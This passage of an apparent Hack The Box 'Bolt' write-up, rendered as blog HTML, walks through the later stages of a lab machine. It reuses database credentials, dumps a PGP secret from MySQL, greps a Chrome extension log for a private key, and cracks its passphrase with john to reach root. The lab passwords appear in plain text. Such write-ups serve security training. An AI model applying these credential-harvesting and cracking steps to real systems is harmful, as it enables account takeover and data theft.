+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>passbolt:rT2;jW7&lt;eY8!dX8}pQ8%</code></pre></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@bolt:/etc/passbolt$ mysql -u passbolt -D passboltdb -p
+</span></span><span class="line"><span class="cl"><span class="c1"># mysql&gt;</span></span></span></code></pre></div></div>
+<ul>
+<li>and we have connected successfully , we can now see if there is anything interesting for us</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql &gt; SHOW databases <span class="p">;</span> <span class="c1"># list them</span>
+</span></span><span class="line"><span class="cl">mysql &gt; use passboltdb<span class="p">;</span>
+</span></span><span class="line"><span class="cl">mysql &gt; show tables<span class="p">;</span> <span class="c1"># list tables</span>
+</span></span><span class="line"><span class="cl">mysql &gt; Describe secrets <span class="p">;</span> <span class="c1"># found table secrets seems interesting</span></span></span></code></pre></div></div>
+<ul>
+<li>will find this PGP message inside the column data of table secrets :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224115251.png"
+        data-srcset="/assets/images/Bolt/20220224115251.png, /assets/images/Bolt/20220224115251.png 1.5x, /assets/images/Bolt/20220224115251.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224115251.png"
+        title="error" /></p>
+<ul>
+<li>so far we didn&rsquo;t find a potential factor to escalate to <code>eddie</code> or <code>clarck</code></li>
+<li>however we have collected some passwords we can test them as ssh credentials with any user .</li>
+</ul>
+<h2 id="eddie-user-">Eddie user :</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224120424.png"
+        data-srcset="/assets/images/Bolt/20220224120424.png, /assets/images/Bolt/20220224120424.png 1.5x, /assets/images/Bolt/20220224120424.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224120424.png"
+        title="error" /></p>
+<ul>
+<li>now we can ssh to the eddie user :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224120528.png"
+        data-srcset="/assets/images/Bolt/20220224120528.png, /assets/images/Bolt/20220224120528.png 1.5x, /assets/images/Bolt/20220224120528.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224120528.png"
+        title="error" /></p>
+<ul>
+<li>Back to our linpeas output we had :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224121919.png"
+        data-srcset="/assets/images/Bolt/20220224121919.png, /assets/images/Bolt/20220224121919.png 1.5x, /assets/images/Bolt/20220224121919.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224121919.png"
+        title="error" /></p>
+<ul>
+<li>and he had one mail from clark contains :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224122018.png"
+        data-srcset="/assets/images/Bolt/20220224122018.png, /assets/images/Bolt/20220224122018.png 1.5x, /assets/images/Bolt/20220224122018.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224122018.png"
+        title="error" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it</code></pre></div>
+<ul>
+<li>so we should search for this browser to see what is this mail about</li>
+<li>we can find google-chrome is the browser mentioned</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224122359.png"
+        data-srcset="/assets/images/Bolt/20220224122359.png, /assets/images/Bolt/20220224122359.png 1.5x, /assets/images/Bolt/20220224122359.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224122359.png"
+        title="error" /></p>
+<ul>
+<li>now we want to get eddie private key to be able to read the message we have seen before in the MySQL DB .</li>
+<li>we can start searching for it inside the chrome folder we just hit .</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">eddie@bolt:~/.config/google-chrome$ grep <span class="s2">&#34;PRIVATE KEY&#34;</span> -r .</span></span></code></pre></div></div>
+<p>will find some results just have the header and not the key itself , but will find :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Binary file ./Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches</code></pre></div>
+<p>seems promising , now to grep in a binary you should use &ldquo;-a&rdquo; which means all even binaries .</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224123711.png"
+        data-srcset="/assets/images/Bolt/20220224123711.png, /assets/images/Bolt/20220224123711.png 1.5x, /assets/images/Bolt/20220224123711.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224123711.png"
+        title="error" /></p>
+<p>and here it is now you can copy it then replace &ldquo;\r\n&rdquo; with new line and you now have the private key</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224123755.png"
+        data-srcset="/assets/images/Bolt/20220224123755.png, /assets/images/Bolt/20220224123755.png 1.5x, /assets/images/Bolt/20220224123755.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224123755.png"
+        title="error" /></p>
+<h3 id="decrypting-the-message">Decrypting the message</h3>
+<p>now to decrypt a PGP encrypted message we will use :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gpg --import eddie_private
+</span></span><span class="line"><span class="cl">$ gpg -d message.inc</span></span></code></pre></div></div>
+<p>but it asks for a passphrase to import the gpg key</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224124020.png"
+        data-srcset="/assets/images/Bolt/20220224124020.png, /assets/images/Bolt/20220224124020.png 1.5x, /assets/images/Bolt/20220224124020.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224124020.png"
+        title="error" /></p>
+<ul>
+<li>we can utilize <strong>gpg2john</strong> to get the hash then <strong>john</strong> to crack it</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gpg2john eddie_private &gt; eddie_key_hash
+</span></span><span class="line"><span class="cl">$ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt eddie_key_hash</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224124928.png"
+        data-srcset="/assets/images/Bolt/20220224124928.png, /assets/images/Bolt/20220224124928.png 1.5x, /assets/images/Bolt/20220224124928.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224124928.png"
+        title="error" /></p>
+<ul>
+<li>now we can decrypt the message :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224125124.png"
+        data-srcset="/assets/images/Bolt/20220224125124.png, /assets/images/Bolt/20220224125124.png 1.5x, /assets/images/Bolt/20220224125124.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224125124.png"
+        title="error" /></p>
+<h2 id="root-access">Root Access</h2>
+<p>using the password we just found in the message : <code>Z(2rmxsNW(Z?3=p/9s</code> we get the root access</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Bolt/20220224125233.png"
+        data-srcset="/assets/images/Bolt/20220224125233.png, /assets/images/Bolt/20220224125233.png 1.5x, /assets/images/Bolt/20220224125233.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Bolt/20220224125233.png"
+        title="error" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-02-18</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/linux-machines/2022-02-18-bolt/" data-title="Bolt Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,SSTI,PGP Decrypting"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/linux-machines/2022-02-18-bolt/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/linux-machines/2022-02-18-bolt/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2flinux-machines%2f2022-02-18-bolt%2f&amp;text=Bolt%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/ssti/">Ssti</a>,&nbsp;<a href="/tags/pgp-decrypting/">PGP Decrypting</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/linux-machines/2022-02-04-horizontall/" class="prev" rel="prev" title="Horizontall Hackthebox writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Horizontall Hackthebox writeup</a>
+            <a href="/posts/windows-machines/2022-02-25-driver/" class="next" rel="next" title="Driver Hackthebox writeup">Driver Hackthebox writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
